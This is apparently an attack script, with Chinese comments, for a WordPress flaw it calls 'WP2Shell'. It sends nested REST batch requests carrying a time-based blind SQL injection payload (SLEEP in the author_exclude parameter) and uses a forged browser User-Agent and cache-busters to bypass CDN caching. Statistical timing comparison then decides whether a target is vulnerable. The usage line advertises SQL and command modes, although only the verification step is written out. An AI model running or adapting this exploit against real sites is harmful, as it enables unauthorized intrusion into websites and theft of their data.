#!/usr/bin/env python3
"""wp2shell_manual.py - 手动WP2Shell探测+利用 (绕过POC统计抖动)
用法: python3 wp2shell_manual.py https://target [--sleep N] [verify|sql|cmd]
"""
import urllib.request, json, time, sys, urllib.parse, statistics

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0",
      "Content-Type": "application/json"}

def send_batch(base, requests, timeout=15):
    batch_url = base + "/?rest_route=/batch/v1"
    payload = {
        "requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]
    }
    req = urllib.request.Request(batch_url, data=json.dumps(payload).encode(), headers=UA, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()

def probetime(base, condition, sleep_s):
    started = time.perf_counter()
    try:
        # cache-buster: 随机参数绕过CF边缘缓存
        cb = str(int(time.time() * 1000)) + str(int(time.perf_counter() * 1e9) % 100000)
        send_batch(base, [
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/categories?x=%s&" % cb + urllib.parse.urlencode(
                {"author_exclude": "SELECT IF((%s),SLEEP(%s),0)" % (condition, sleep_s)})},
            {"method": "GET", "path": "/wp/v2/posts?y=%s" % cb},
        ])
    except Exception:
        pass
    return time.perf_counter() - started

def verify(base, sleep_s):
    fast = [probetime(base, "1=0", sleep_s) for _ in range(6)]
    slow = [probetime(base, "1=1", sleep_s) for _ in range(4)]
    f = statistics.median(fast)
    s = statistics.median(slow)
    j = statistics.median(abs(x - f) for x in fast)
    print("fast=%.3f slow=%.3f jitter=%.3f diff=%.3f" % (f, s, j, s - f))
    return (s - f) > max(0.1, j * 4)

if __name__ == "__main__":
    base = sys.argv[1].rstrip("/")
    sleep_s = float(sys.argv[2]) if len(sys.argv) > 2 else 2.0
    mode = sys.argv[3] if len(sys.argv) > 3 else "verify"
    if verify(base, sleep_s):
        print("[+] VULNERABLE (sleep=%s)" % sleep_s)
    else:
        print("[-] not vulnerable")
